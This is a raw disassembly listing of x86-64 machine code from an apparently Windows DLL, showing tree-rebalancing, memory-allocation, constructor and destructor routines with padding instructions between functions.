   180001e23:	49 89 48 08          	mov    %rcx,0x8(%r8)
   180001e27:	49 8b 0a             	mov    (%r10),%rcx
   180001e2a:	48 3b 41 08          	cmp    0x8(%rcx),%rax
   180001e2e:	75 06                	jne    0x180001e36
   180001e30:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   180001e34:	eb 12                	jmp    0x180001e48
   180001e36:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001e3a:	48 3b 01             	cmp    (%rcx),%rax
   180001e3d:	75 05                	jne    0x180001e44
   180001e3f:	4c 89 01             	mov    %r8,(%rcx)
   180001e42:	eb 04                	jmp    0x180001e48
   180001e44:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   180001e48:	49 89 00             	mov    %rax,(%r8)
   180001e4b:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180001e4f:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001e53:	c6 40 18 01          	movb   $0x1,0x18(%rax)
   180001e57:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001e5b:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001e5f:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   180001e63:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001e67:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001e6b:	4c 8b 01             	mov    (%rcx),%r8
   180001e6e:	49 8b 40 10          	mov    0x10(%r8),%rax
   180001e72:	48 89 01             	mov    %rax,(%rcx)
   180001e75:	49 8b 40 10          	mov    0x10(%r8),%rax
   180001e79:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180001e7d:	75 04                	jne    0x180001e83
   180001e7f:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001e83:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180001e87:	49 89 40 08          	mov    %rax,0x8(%r8)
   180001e8b:	49 8b 02             	mov    (%r10),%rax
   180001e8e:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   180001e92:	75 0d                	jne    0x180001ea1
   180001e94:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180001e98:	49 89 48 10          	mov    %rcx,0x10(%r8)
   180001e9c:	e9 fc 00 00 00       	jmp    0x180001f9d
   180001ea1:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180001ea5:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   180001ea9:	75 0d                	jne    0x180001eb8
   180001eab:	4c 89 40 10          	mov    %r8,0x10(%rax)
   180001eaf:	49 89 48 10          	mov    %rcx,0x10(%r8)
   180001eb3:	e9 e5 00 00 00       	jmp    0x180001f9d
   180001eb8:	4c 89 00             	mov    %r8,(%rax)
   180001ebb:	49 89 48 10          	mov    %rcx,0x10(%r8)
   180001ebf:	e9 d9 00 00 00       	jmp    0x180001f9d
   180001ec4:	80 79 18 00          	cmpb   $0x0,0x18(%rcx)
   180001ec8:	75 21                	jne    0x180001eeb
   180001eca:	c6 40 18 01          	movb   $0x1,0x18(%rax)
   180001ece:	c6 41 18 01          	movb   $0x1,0x18(%rcx)
   180001ed2:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001ed6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001eda:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   180001ede:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001ee2:	48 8b 50 08          	mov    0x8(%rax),%rdx
   180001ee6:	e9 b6 00 00 00       	jmp    0x180001fa1
   180001eeb:	4c 8b 00             	mov    (%rax),%r8
   180001eee:	49 3b d0             	cmp    %r8,%rdx
   180001ef1:	75 4a                	jne    0x180001f3d
   180001ef3:	49 8b 48 10          	mov    0x10(%r8),%rcx
   180001ef7:	48 8b d0             	mov    %rax,%rdx
   180001efa:	48 89 08             	mov    %rcx,(%rax)
   180001efd:	49 8b 48 10          	mov    0x10(%r8),%rcx
   180001f01:	80 79 19 00          	cmpb   $0x0,0x19(%rcx)
   180001f05:	75 04                	jne    0x180001f0b
   180001f07:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001f0b:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001f0f:	49 89 48 08          	mov    %rcx,0x8(%r8)
   180001f13:	49 8b 0a             	mov    (%r10),%rcx
   180001f16:	48 3b 41 08          	cmp    0x8(%rcx),%rax
   180001f1a:	75 06                	jne    0x180001f22
   180001f1c:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   180001f20:	eb 13                	jmp    0x180001f35
   180001f22:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001f26:	48 3b 41 10          	cmp    0x10(%rcx),%rax
   180001f2a:	75 06                	jne    0x180001f32
   180001f2c:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   180001f30:	eb 03                	jmp    0x180001f35
   180001f32:	4c 89 01             	mov    %r8,(%rcx)
   180001f35:	49 89 40 10          	mov    %rax,0x10(%r8)
   180001f39:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180001f3d:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001f41:	c6 40 18 01          	movb   $0x1,0x18(%rax)
   180001f45:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001f49:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001f4d:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   180001f51:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001f55:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001f59:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   180001f5d:	49 8b 00             	mov    (%r8),%rax
   180001f60:	48 89 41 10          	mov    %rax,0x10(%rcx)
   180001f64:	49 8b 00             	mov    (%r8),%rax
   180001f67:	80 78 19 00          	cmpb   $0x0,0x19(%rax)
   180001f6b:	75 04                	jne    0x180001f71
   180001f6d:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180001f71:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180001f75:	49 89 40 08          	mov    %rax,0x8(%r8)
   180001f79:	49 8b 02             	mov    (%r10),%rax
   180001f7c:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   180001f80:	75 06                	jne    0x180001f88
   180001f82:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180001f86:	eb 12                	jmp    0x180001f9a
   180001f88:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180001f8c:	48 3b 08             	cmp    (%rax),%rcx
   180001f8f:	75 05                	jne    0x180001f96
   180001f91:	4c 89 00             	mov    %r8,(%rax)
   180001f94:	eb 04                	jmp    0x180001f9a
   180001f96:	4c 89 40 10          	mov    %r8,0x10(%rax)
   180001f9a:	49 89 08             	mov    %rcx,(%r8)
   180001f9d:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   180001fa1:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001fa5:	80 78 18 00          	cmpb   $0x0,0x18(%rax)
   180001fa9:	0f 84 11 fe ff ff    	je     0x180001dc0
   180001faf:	49 8b 43 08          	mov    0x8(%r11),%rax
   180001fb3:	c6 40 18 01          	movb   $0x1,0x18(%rax)
   180001fb7:	49 8b c1             	mov    %r9,%rax
   180001fba:	c3                   	ret
   180001fbb:	cc                   	int3
   180001fbc:	cc                   	int3
   180001fbd:	cc                   	int3
   180001fbe:	cc                   	int3
   180001fbf:	cc                   	int3
   180001fc0:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   180001fc4:	48 85 c9             	test   %rcx,%rcx
   180001fc7:	74 0a                	je     0x180001fd3
   180001fc9:	ba 28 00 00 00       	mov    $0x28,%edx
   180001fce:	e9 85 cf 03 00       	jmp    0x18003ef58
   180001fd3:	c3                   	ret
   180001fd4:	cc                   	int3
   180001fd5:	cc                   	int3
   180001fd6:	cc                   	int3
   180001fd7:	cc                   	int3
   180001fd8:	cc                   	int3
   180001fd9:	cc                   	int3
   180001fda:	cc                   	int3
   180001fdb:	cc                   	int3
   180001fdc:	cc                   	int3
   180001fdd:	cc                   	int3
   180001fde:	cc                   	int3
   180001fdf:	cc                   	int3
   180001fe0:	48 83 ec 38          	sub    $0x38,%rsp
   180001fe4:	48 85 c9             	test   %rcx,%rcx
   180001fe7:	75 07                	jne    0x180001ff0
   180001fe9:	33 c0                	xor    %eax,%eax
   180001feb:	48 83 c4 38          	add    $0x38,%rsp
   180001fef:	c3                   	ret
   180001ff0:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   180001ff7:	72 3e                	jb     0x180002037
   180001ff9:	48 8d 41 27          	lea    0x27(%rcx),%rax
   180001ffd:	48 3b c1             	cmp    %rcx,%rax
   180002000:	76 3e                	jbe    0x180002040
   180002002:	48 8b c8             	mov    %rax,%rcx
   180002005:	e8 9a cb 03 00       	call   0x18003eba4
   18000200a:	48 8b c8             	mov    %rax,%rcx
   18000200d:	48 85 c0             	test   %rax,%rax
   180002010:	75 14                	jne    0x180002026
   180002012:	45 33 c9             	xor    %r9d,%r9d
   180002015:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000201a:	45 33 c0             	xor    %r8d,%r8d
   18000201d:	33 d2                	xor    %edx,%edx
   18000201f:	ff 15 7b f4 03 00    	call   *0x3f47b(%rip)        # 0x1800414a0
   180002025:	cc                   	int3
   180002026:	48 83 c0 27          	add    $0x27,%rax
   18000202a:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   18000202e:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   180002032:	48 83 c4 38          	add    $0x38,%rsp
   180002036:	c3                   	ret
   180002037:	48 83 c4 38          	add    $0x38,%rsp
   18000203b:	e9 64 cb 03 00       	jmp    0x18003eba4
   180002040:	e8 bb f4 ff ff       	call   0x180001500
   180002045:	cc                   	int3
   180002046:	cc                   	int3
   180002047:	cc                   	int3
   180002048:	cc                   	int3
   180002049:	cc                   	int3
   18000204a:	cc                   	int3
   18000204b:	cc                   	int3
   18000204c:	cc                   	int3
   18000204d:	cc                   	int3
   18000204e:	cc                   	int3
   18000204f:	cc                   	int3
   180002050:	c2 00 00             	ret    $0x0
   180002053:	cc                   	int3
   180002054:	cc                   	int3
   180002055:	cc                   	int3
   180002056:	cc                   	int3
   180002057:	cc                   	int3
   180002058:	cc                   	int3
   180002059:	cc                   	int3
   18000205a:	cc                   	int3
   18000205b:	cc                   	int3
   18000205c:	cc                   	int3
   18000205d:	cc                   	int3
   18000205e:	cc                   	int3
   18000205f:	cc                   	int3
   180002060:	40 53                	rex push %rbx
   180002062:	48 83 ec 20          	sub    $0x20,%rsp
   180002066:	48 8b d9             	mov    %rcx,%rbx
   180002069:	e8 b2 0d 02 00       	call   0x180022e20
   18000206e:	90                   	nop
   18000206f:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180002073:	48 85 c9             	test   %rcx,%rcx
   180002076:	74 19                	je     0x180002091
   180002078:	48 8b 05 51 ad 07 00 	mov    0x7ad51(%rip),%rax        # 0x18007cdd0
   18000207f:	48 85 c0             	test   %rax,%rax
   180002082:	74 06                	je     0x18000208a
   180002084:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   18000208a:	ff 15 48 f3 03 00    	call   *0x3f348(%rip)        # 0x1800413d8
   180002090:	90                   	nop
   180002091:	48 83 c4 20          	add    $0x20,%rsp
   180002095:	5b                   	pop    %rbx
   180002096:	c3                   	ret
   180002097:	cc                   	int3
   180002098:	cc                   	int3
   180002099:	cc                   	int3
   18000209a:	cc                   	int3
   18000209b:	cc                   	int3
   18000209c:	cc                   	int3
   18000209d:	cc                   	int3
   18000209e:	cc                   	int3
   18000209f:	cc                   	int3
   1800020a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800020a5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1800020aa:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800020af:	56                   	push   %rsi
   1800020b0:	57                   	push   %rdi
   1800020b1:	41 54                	push   %r12
   1800020b3:	41 56                	push   %r14
   1800020b5:	41 57                	push   %r15
   1800020b7:	48 83 ec 20          	sub    $0x20,%rsp
   1800020bb:	48 8b d9             	mov    %rcx,%rbx
   1800020be:	45 33 e4             	xor    %r12d,%r12d
   1800020c1:	4c 89 21             	mov    %r12,(%rcx)
   1800020c4:	4c 89 61 08          	mov    %r12,0x8(%rcx)
   1800020c8:	4c 89 61 10          	mov    %r12,0x10(%rcx)
   1800020cc:	4c 89 61 18          	mov    %r12,0x18(%rcx)
   1800020d0:	4c 89 61 20          	mov    %r12,0x20(%rcx)
   1800020d4:	4c 89 61 28          	mov    %r12,0x28(%rcx)
   1800020d8:	4c 89 61 60          	mov    %r12,0x60(%rcx)
   1800020dc:	4c 89 61 68          	mov    %r12,0x68(%rcx)
   1800020e0:	4c 89 61 70          	mov    %r12,0x70(%rcx)
   1800020e4:	4c 89 61 78          	mov    %r12,0x78(%rcx)
   1800020e8:	48 8d b9 80 00 00 00 	lea    0x80(%rcx),%rdi
   1800020ef:	4c 89 27             	mov    %r12,(%rdi)
   1800020f2:	4c 89 67 08          	mov    %r12,0x8(%rdi)
   1800020f6:	4c 89 a1 98 00 00 00 	mov    %r12,0x98(%rcx)
   1800020fd:	4c 89 a1 a0 00 00 00 	mov    %r12,0xa0(%rcx)
   180002104:	44 89 a1 90 00 00 00 	mov    %r12d,0x90(%rcx)
   18000210b:	c7 81 94 00 00 00 01 	movl   $0x1,0x94(%rcx)
   180002112:	00 00 00 
   180002115:	48 89 51 38          	mov    %rdx,0x38(%rcx)
   180002119:	4c 89 61 40          	mov    %r12,0x40(%rcx)
   18000211d:	8b 49 04             	mov    0x4(%rcx),%ecx
   180002120:	85 c9                	test   %ecx,%ecx
   180002122:	79 19                	jns    0x18000213d
   180002124:	8b c1                	mov    %ecx,%eax
   180002126:	99                   	cltd
   180002127:	2b c2                	sub    %edx,%eax
   180002129:	d1 f8                	sar    $1,%eax
   18000212b:	03 c8                	add    %eax,%ecx
   18000212d:	41 8b d4             	mov    %r12d,%edx
   180002130:	85 c9                	test   %ecx,%ecx
   180002132:	0f 4f d1             	cmovg  %ecx,%edx
   180002135:	48 8b cb             	mov    %rbx,%rcx
   180002138:	e8 f3 64 02 00       	call   0x180028630
   18000213d:	44 89 23             	mov    %r12d,(%rbx)
   180002140:	8b 4b 14             	mov    0x14(%rbx),%ecx
   180002143:	85 c9                	test   %ecx,%ecx
   180002145:	79 1a                	jns    0x180002161
   180002147:	8b c1                	mov    %ecx,%eax
   180002149:	99                   	cltd
   18000214a:	2b c2                	sub    %edx,%eax
   18000214c:	d1 f8                	sar    $1,%eax
   18000214e:	03 c8                	add    %eax,%ecx
   180002150:	41 8b d4             	mov    %r12d,%edx
   180002153:	85 c9                	test   %ecx,%ecx
   180002155:	0f 4f d1             	cmovg  %ecx,%edx
   180002158:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   18000215c:	e8 bf 5a 01 00       	call   0x180017c20
   180002161:	44 89 63 10          	mov    %r12d,0x10(%rbx)
   180002165:	8b 4b 24             	mov    0x24(%rbx),%ecx
   180002168:	85 c9                	test   %ecx,%ecx
   18000216a:	79 1a                	jns    0x180002186
   18000216c:	8b c1                	mov    %ecx,%eax
   18000216e:	99                   	cltd
   18000216f:	2b c2                	sub    %edx,%eax
   180002171:	d1 f8                	sar    $1,%eax
   180002173:	03 c8                	add    %eax,%ecx
   180002175:	41 8b d4             	mov    %r12d,%edx
   180002178:	85 c9                	test   %ecx,%ecx
   18000217a:	0f 4f d1             	cmovg  %ecx,%edx
   18000217d:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
   180002181:	e8 0a 58 01 00       	call   0x180017990
   180002186:	44 89 63 20          	mov    %r12d,0x20(%rbx)
   18000218a:	48 8b 43 38          	mov    0x38(%rbx),%rax
   18000218e:	48 85 c0             	test   %rax,%rax
   180002191:	74 05                	je     0x180002198
   180002193:	8b 40 28             	mov    0x28(%rax),%eax
   180002196:	eb 03                	jmp    0x18000219b
   180002198:	41 8b c4             	mov    %r12d,%eax
   18000219b:	89 43 30             	mov    %eax,0x30(%rbx)
   18000219e:	4c 89 63 48          	mov    %r12,0x48(%rbx)
   1800021a2:	4c 89 63 50          	mov    %r12,0x50(%rbx)
   1800021a6:	4c 89 63 58          	mov    %r12,0x58(%rbx)
   1800021aa:	8b 4b 64             	mov    0x64(%rbx),%ecx
   1800021ad:	85 c9                	test   %ecx,%ecx
   1800021af:	79 1a                	jns    0x1800021cb
   1800021b1:	8b c1                	mov    %ecx,%eax
   1800021b3:	99                   	cltd
   1800021b4:	2b c2                	sub    %edx,%eax
   1800021b6:	d1 f8                	sar    $1,%eax
   1800021b8:	03 c8                	add    %eax,%ecx
   1800021ba:	41 8b d4             	mov    %r12d,%edx
   1800021bd:	85 c9                	test   %ecx,%ecx
   1800021bf:	0f 4f d1             	cmovg  %ecx,%edx
   1800021c2:	48 8d 4b 60          	lea    0x60(%rbx),%rcx
   1800021c6:	e8 d5 63 02 00       	call   0x1800285a0
   1800021cb:	44 89 63 60          	mov    %r12d,0x60(%rbx)
   1800021cf:	8b 4b 74             	mov    0x74(%rbx),%ecx
   1800021d2:	85 c9                	test   %ecx,%ecx
   1800021d4:	79 1a                	jns    0x1800021f0
   1800021d6:	8b c1                	mov    %ecx,%eax
   1800021d8:	99                   	cltd
   1800021d9:	2b c2                	sub    %edx,%eax
   1800021db:	d1 f8                	sar    $1,%eax
   1800021dd:	03 c8                	add    %eax,%ecx
   1800021df:	41 8b d4             	mov    %r12d,%edx
   1800021e2:	85 c9                	test   %ecx,%ecx
   1800021e4:	0f 4f d1             	cmovg  %ecx,%edx
   1800021e7:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   1800021eb:	e8 d0 52 01 00       	call   0x1800174c0
   1800021f0:	44 89 63 70          	mov    %r12d,0x70(%rbx)
   1800021f4:	8b 4f 04             	mov    0x4(%rdi),%ecx
   1800021f7:	85 c9                	test   %ecx,%ecx
   1800021f9:	79 19                	jns    0x180002214
   1800021fb:	8b c1                	mov    %ecx,%eax
   1800021fd:	99                   	cltd
   1800021fe:	2b c2                	sub    %edx,%eax
   180002200:	d1 f8                	sar    $1,%eax
   180002202:	03 c8                	add    %eax,%ecx
   180002204:	41 8b d4             	mov    %r12d,%edx
   180002207:	85 c9                	test   %ecx,%ecx
   180002209:	0f 4f d1             	cmovg  %ecx,%edx
   18000220c:	48 8b cf             	mov    %rdi,%rcx
   18000220f:	e8 ac 52 01 00       	call   0x1800174c0
   180002214:	44 89 27             	mov    %r12d,(%rdi)
   180002217:	44 89 a3 90 00 00 00 	mov    %r12d,0x90(%rbx)
   18000221e:	c7 83 94 00 00 00 01 	movl   $0x1,0x94(%rbx)
   180002225:	00 00 00 
   180002228:	48 8b c3             	mov    %rbx,%rax
   18000222b:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   180002230:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   180002235:	48 83 c4 20          	add    $0x20,%rsp
   180002239:	41 5f                	pop    %r15
   18000223b:	41 5e                	pop    %r14
   18000223d:	41 5c                	pop    %r12
   18000223f:	5f                   	pop    %rdi
   180002240:	5e                   	pop    %rsi
   180002241:	c3                   	ret
   180002242:	cc                   	int3
   180002243:	cc                   	int3
   180002244:	cc                   	int3
   180002245:	cc                   	int3
   180002246:	cc                   	int3
   180002247:	cc                   	int3
   180002248:	cc                   	int3
   180002249:	cc                   	int3
   18000224a:	cc                   	int3
   18000224b:	cc                   	int3
   18000224c:	cc                   	int3
   18000224d:	cc                   	int3
   18000224e:	cc                   	int3
   18000224f:	cc                   	int3
   180002250:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002255:	57                   	push   %rdi
   180002256:	48 83 ec 20          	sub    $0x20,%rsp
   18000225a:	48 8b f9             	mov    %rcx,%rdi
   18000225d:	e8 7e de 01 00       	call   0x1800200e0
   180002262:	90                   	nop
   180002263:	48 8d 8f 90 00 00 00 	lea    0x90(%rdi),%rcx
   18000226a:	e8 b1 0b 02 00       	call   0x180022e20
   18000226f:	90                   	nop
   180002270:	48 8b 8f a0 00 00 00 	mov    0xa0(%rdi),%rcx
   180002277:	48 85 c9             	test   %rcx,%rcx
   18000227a:	74 19                	je     0x180002295
   18000227c:	48 8b 05 4d ab 07 00 	mov    0x7ab4d(%rip),%rax        # 0x18007cdd0
   180002283:	48 85 c0             	test   %rax,%rax
   180002286:	74 06                	je     0x18000228e
   180002288:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   18000228e:	ff 15 44 f1 03 00    	call   *0x3f144(%rip)        # 0x1800413d8
   180002294:	90                   	nop
   180002295:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   18000229c:	48 85 c9             	test   %rcx,%rcx
   18000229f:	74 19                	je     0x1800022ba
   1800022a1:	48 8b 05 28 ab 07 00 	mov    0x7ab28(%rip),%rax        # 0x18007cdd0
   1800022a8:	48 85 c0             	test   %rax,%rax
   1800022ab:	74 06                	je     0x1800022b3
   1800022ad:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   1800022b3:	ff 15 1f f1 03 00    	call   *0x3f11f(%rip)        # 0x1800413d8
   1800022b9:	90                   	nop
   1800022ba:	48 8b 4f 78          	mov    0x78(%rdi),%rcx
   1800022be:	48 85 c9             	test   %rcx,%rcx
   1800022c1:	74 19                	je     0x1800022dc
   1800022c3:	48 8b 05 06 ab 07 00 	mov    0x7ab06(%rip),%rax        # 0x18007cdd0
   1800022ca:	48 85 c0             	test   %rax,%rax
   1800022cd:	74 06                	je     0x1800022d5
   1800022cf:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   1800022d5:	ff 15 fd f0 03 00    	call   *0x3f0fd(%rip)        # 0x1800413d8
   1800022db:	90                   	nop
   1800022dc:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   1800022e0:	48 85 c9             	test   %rcx,%rcx
   1800022e3:	74 19                	je     0x1800022fe
   1800022e5:	48 8b 05 e4 aa 07 00 	mov    0x7aae4(%rip),%rax        # 0x18007cdd0
   1800022ec:	48 85 c0             	test   %rax,%rax
   1800022ef:	74 06                	je     0x1800022f7
   1800022f1:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   1800022f7:	ff 15 db f0 03 00    	call   *0x3f0db(%rip)        # 0x1800413d8
   1800022fd:	90                   	nop
   1800022fe:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   180002302:	48 85 c9             	test   %rcx,%rcx
   180002305:	74 19                	je     0x180002320
   180002307:	48 8b 05 c2 aa 07 00 	mov    0x7aac2(%rip),%rax        # 0x18007cdd0
   18000230e:	48 85 c0             	test   %rax,%rax
   180002311:	74 06                	je     0x180002319
   180002313:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   180002319:	ff 15 b9 f0 03 00    	call   *0x3f0b9(%rip)        # 0x1800413d8
   18000231f:	90                   	nop
   180002320:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   180002324:	48 85 c9             	test   %rcx,%rcx
   180002327:	74 19                	je     0x180002342
   180002329:	48 8b 05 a0 aa 07 00 	mov    0x7aaa0(%rip),%rax        # 0x18007cdd0
   180002330:	48 85 c0             	test   %rax,%rax
   180002333:	74 06                	je     0x18000233b
   180002335:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   18000233b:	ff 15 97 f0 03 00    	call   *0x3f097(%rip)        # 0x1800413d8
   180002341:	90                   	nop
   180002342:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   180002346:	48 85 c9             	test   %rcx,%rcx
   180002349:	74 19                	je     0x180002364
   18000234b:	48 8b 05 7e aa 07 00 	mov    0x7aa7e(%rip),%rax        # 0x18007cdd0
   180002352:	48 85 c0             	test   %rax,%rax
   180002355:	74 06                	je     0x18000235d
   180002357:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   18000235d:	ff 15 75 f0 03 00    	call   *0x3f075(%rip)        # 0x1800413d8
   180002363:	90                   	nop
   180002364:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002369:	48 83 c4 20          	add    $0x20,%rsp
   18000236d:	5f                   	pop    %rdi
   18000236e:	c3                   	ret
   18000236f:	cc                   	int3
   180002370:	33 c0                	xor    %eax,%eax
   180002372:	c6 01 00             	movb   $0x0,(%rcx)
   180002375:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180002379:	48 89 41 14          	mov    %rax,0x14(%rcx)
   18000237d:	89 41 10             	mov    %eax,0x10(%rcx)
   180002380:	48 89 41 2c          	mov    %rax,0x2c(%rcx)
   180002384:	48 89 41 24          	mov    %rax,0x24(%rcx)
   180002388:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   18000238c:	c3                   	ret
   18000238d:	cc                   	int3
   18000238e:	cc                   	int3
   18000238f:	cc                   	int3
   180002390:	48 8d 05 e1 af 07 00 	lea    0x7afe1(%rip),%rax        # 0x18007d378
   180002397:	c3                   	ret
   180002398:	cc                   	int3
   180002399:	cc                   	int3
   18000239a:	cc                   	int3
   18000239b:	cc                   	int3
   18000239c:	cc                   	int3
   18000239d:	cc                   	int3
   18000239e:	cc                   	int3
   18000239f:	cc                   	int3
   1800023a0:	48 8d 05 d9 af 07 00 	lea    0x7afd9(%rip),%rax        # 0x18007d380
   1800023a7:	c3                   	ret
   1800023a8:	cc                   	int3
   1800023a9:	cc                   	int3
   1800023aa:	cc                   	int3
   1800023ab:	cc                   	int3
   1800023ac:	cc                   	int3
   1800023ad:	cc                   	int3
   1800023ae:	cc                   	int3
   1800023af:	cc                   	int3
   1800023b0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800023b5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800023ba:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800023bf:	53                   	push   %rbx
   1800023c0:	56                   	push   %rsi
   1800023c1:	57                   	push   %rdi
   1800023c2:	48 83 ec 30          	sub    $0x30,%rsp
   1800023c6:	48 8b fa             	mov    %rdx,%rdi
   1800023c9:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   1800023ce:	48 8b d9             	mov    %rcx,%rbx
   1800023d1:	e8 ca ff ff ff       	call   0x1800023a0
   1800023d6:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1800023db:	4c 8b cf             	mov    %rdi,%r9
   1800023de:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1800023e5:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1800023ec:	00 00 
   1800023ee:	48 8b d3             	mov    %rbx,%rdx
   1800023f1:	48 8b 08             	mov    (%rax),%rcx
   1800023f4:	ff 15 ce f0 03 00    	call   *0x3f0ce(%rip)        # 0x1800414c8
   1800023fa:	48 83 c4 30          	add    $0x30,%rsp
   1800023fe:	5f                   	pop    %rdi
   1800023ff:	5e                   	pop    %rsi
   180002400:	5b                   	pop    %rbx
   180002401:	c3                   	ret
   180002402:	cc                   	int3
   180002403:	cc                   	int3
   180002404:	cc                   	int3
   180002405:	cc                   	int3
   180002406:	cc                   	int3
   180002407:	cc                   	int3
   180002408:	cc                   	int3
   180002409:	cc                   	int3
   18000240a:	cc                   	int3
   18000240b:	cc                   	int3
   18000240c:	cc                   	int3
   18000240d:	cc                   	int3
   18000240e:	cc                   	int3
   18000240f:	cc                   	int3
   180002410:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180002415:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000241a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   18000241f:	56                   	push   %rsi
   180002420:	57                   	push   %rdi
   180002421:	41 56                	push   %r14
   180002423:	48 83 ec 60          	sub    $0x60,%rsp
   180002427:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   18000242c:	0f 29 7c 24 40       	movaps %xmm7,0x40(%rsp)
   180002431:	44 0f 29 44 24 30    	movaps %xmm8,0x30(%rsp)
   180002437:	48 8b d9             	mov    %rcx,%rbx
   18000243a:	48 83 c1 08          	add    $0x8,%rcx
   18000243e:	e8 bd 0b 00 00       	call   0x180003000
   180002443:	90                   	nop
   180002444:	48 8d 8b 58 15 00 00 	lea    0x1558(%rbx),%rcx
   18000244b:	e8 50 0a 00 00       	call   0x180002ea0
   180002450:	4c 8d b3 18 19 00 00 	lea    0x1918(%rbx),%r14
   180002457:	33 ed                	xor    %ebp,%ebp
   180002459:	49 89 2e             	mov    %rbp,(%r14)
   18000245c:	49 8d 7e 2c          	lea    0x2c(%r14),%rdi
   180002460:	48 8b c7             	mov    %rdi,%rax
   180002463:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180002468:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000246f:	00 
   180002470:	48 89 28             	mov    %rbp,(%rax)
   180002473:	48 8d 40 08          	lea    0x8(%rax),%rax
   180002477:	48 83 e9 01          	sub    $0x1,%rcx
   18000247b:	75 f3                	jne    0x180002470
   18000247d:	49 89 6e 08          	mov    %rbp,0x8(%r14)
   180002481:	49 89 6e 10          	mov    %rbp,0x10(%r14)
   180002485:	41 c7 46 18 00 00 00 	movl   $0xc6000000,0x18(%r14)
   18000248c:	c6 
   18000248d:	41 c7 46 1c 00 00 00 	movl   $0xc6000000,0x1c(%r14)
   180002494:	c6 
   180002495:	41 c7 46 20 00 00 00 	movl   $0x46000000,0x20(%r14)
   18000249c:	46 
   18000249d:	49 c7 46 24 00 00 00 	movq   $0x46000000,0x24(%r14)
   1800024a4:	46 
   1800024a5:	8b f5                	mov    %ebp,%esi
   1800024a7:	f3 0f 10 3d 7d 96 04 	movss  0x4967d(%rip),%xmm7        # 0x18004bb2c
   1800024ae:	00 
   1800024af:	f3 44 0f 10 05 a4 96 	movss  0x496a4(%rip),%xmm8        # 0x18004bb5c
